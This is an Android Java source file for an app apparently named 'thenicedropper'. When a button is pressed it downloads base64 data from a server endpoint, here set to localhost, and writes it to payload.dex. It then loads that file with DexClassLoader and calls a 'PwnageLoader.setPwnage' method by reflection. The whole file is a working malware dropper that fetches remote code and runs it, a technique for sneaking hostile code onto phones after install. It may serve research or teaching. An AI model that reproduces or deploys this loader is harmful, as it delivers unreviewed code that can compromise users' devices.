package com.zexteam.thenicedropper;

import android.app.AlertDialog;
import android.content.Context;
import android.graphics.Color;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import android.view.Gravity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btn = (Button) findViewById(R.id.button2);
        btn.setOnClickListener(downloadFromServer);
    }

    private View.OnClickListener downloadFromServer = new View.OnClickListener() {
        public void onClick(View v) {
            File path = new File(getFilesDir(),"payload.dex");
            if (path.exists()){
                Toast.makeText(MainActivity.this, "Payload already exists!", Toast.LENGTH_SHORT).show();
                loadDex();
            }
            else {
                Toast.makeText(MainActivity.this, "Downloading...", Toast.LENGTH_SHORT).show();
                sendRequest();
            }
        }
    };

private void loadDex(){
    File path = new File(getFilesDir(),"payload.dex");

    DexClassLoader dx = new DexClassLoader(path.getAbsolutePath(), getCacheDir().getAbsolutePath(), null, getClassLoader());
    Class<Object> pwnage = null;
    Method setPwnage = null;
    Object pwnageObj = null;
    Class[] paramType = new Class[1];
    paramType[0] = Context.class;
    try {
        pwnage = (Class<Object>)dx.loadClass("com.zexteam.pwnage.PwnageLoader");
    } catch (ClassNotFoundException e) {
        e.printStackTrace();
    }
    try {
        pwnageObj = pwnage.newInstance();
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    } catch (InstantiationException e) {
        e.printStackTrace();
    }

    try {
        setPwnage = pwnage.getMethod("setPwnage", paramType); // get the method you want to call
    } catch (NoSuchMethodException e) {
        e.printStackTrace();
    }
    try {
        setPwnage.invoke(pwnageObj, MainActivity.this);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    } catch (InvocationTargetException e) {
        e.printStackTrace();
    }

}


private void sendRequest(){

    final TextView mTextView = (TextView)findViewById(R.id.textView2);

	// Instantiate the RequestQueue.
    RequestQueue queue = Volley.newRequestQueue(this);
    String url ="http://127.0.0.1/process_command";

    StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
            new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    byte[] data = Base64.decode(response, Base64.DEFAULT);
                    writeToFile(data, getApplicationContext());
                    mTextView.setText("Download success");
                    loadDex();
                }
            }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
            mTextView.setText("Download Failed! : " + error.toString());
        }
    });

// Add the request to the RequestQueue.
    queue.add(stringRequest);


}


private void writeToFile(byte[] data, Context context) {
    try {
        FileOutputStream outputStream = openFileOutput("payload.dex",Context.MODE_PRIVATE);
        outputStream.write(data);
        outputStream.flush();
        outputStream.close();
    }
    catch (IOException e) {
        e.printStackTrace();
		}
	}

}


